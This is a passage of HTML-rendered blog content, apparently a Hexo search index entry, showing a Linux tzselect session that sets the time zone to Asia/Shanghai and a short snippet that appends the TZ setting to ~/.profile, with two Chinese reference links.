class="line">Please select a country whose clocks agree with yours.</span><br><span class="line"> 1) Afghanistan       18) Israel            35) Palestine</span><br><span class="line"> 2) Armenia           19) Japan             36) Philippines</span><br><span class="line"> 3) Azerbaijan        20) Jordan            37) Qatar</span><br><span class="line"> 4) Bahrain           21) Kazakhstan        38) Russia</span><br><span class="line"> 5) Bangladesh        22) Korea (North)     39) Saudi Arabia</span><br><span class="line"> 6) Bhutan            23) Korea (South)     40) Singapore</span><br><span class="line"> 7) Brunei            24) Kuwait            41) Sri Lanka</span><br><span class="line"> 8) Cambodia          25) Kyrgyzstan        42) Syria</span><br><span class="line"> 9) China             26) Laos              43) Taiwan</span><br><span class="line">10) Cyprus            27) Lebanon           44) Tajikistan</span><br><span class="line">11) East Timor        28) Macau             45) Thailand</span><br><span class="line">12) Georgia           29) Malaysia          46) Turkmenistan</span><br><span class="line">13) Hong Kong         30) Mongolia          47) United Arab Emirates</span><br><span class="line">14) India             31) Myanmar (Burma)   48) Uzbekistan</span><br><span class="line">15) Indonesia         32) Nepal             49) Vietnam</span><br><span class="line">16) Iran              33) Oman              50) Yemen</span><br><span class="line">17) Iraq              34) Pakistan</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">9</span></span><br><span class="line">Please select one of the following time zone regions.</span><br><span class="line">1) Beijing Time</span><br><span class="line">2) Xinjiang Time</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">1</span></span><br><span class="line">The following information has been given:</span><br><span class="line">    China</span><br><span class="line">    Beijing Time</span><br><span class="line">Therefore TZ=&#x27;Asia/Shanghai&#x27; will be used.</span><br><span class="line">Local time is now:  Wed Jul 13 18:42:06 CST 2016.</span><br><span class="line">Universal Time is now:  Wed Jul 13 10:42:06 UTC 2016.</span><br><span class="line">Is the above information OK?</span><br><span class="line">1) Yes</span><br><span class="line">2) No</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">1</span></span><br><span class="line">You can make this change permanent for yourself by appending the line</span><br><span class="line">    TZ=&#x27;Asia/Shanghai&#x27;; export TZ</span><br><span class="line">to the file &#x27;.profile&#x27; in your home directory; then log out and log in again.</span><br><span class="line">Here is that TZ value again, this time on standard output so that you</span><br><span class="line">can use the /usr/bin/tzselect command in shell scripts:</span><br><span class="line">Asia/Shanghai</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;TZ=&#x27;Asia/Shanghai&#x27;; export TZ&quot;</span> &gt;&gt; ~/.profile</span><br><span class="line"><span class="built_in">source</span> ~/.profile</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://codingstandards.iteye.com/blog/834280">我使用过的Linux命令之tzselect - 选择时区</a> </li><li><a href="http://www.jb51.net/LINUXjishu/158824.html">linux修改系统时间和linux查看时区、修改时区的方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> timezone </tag>
            
            <tag> tzselect </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
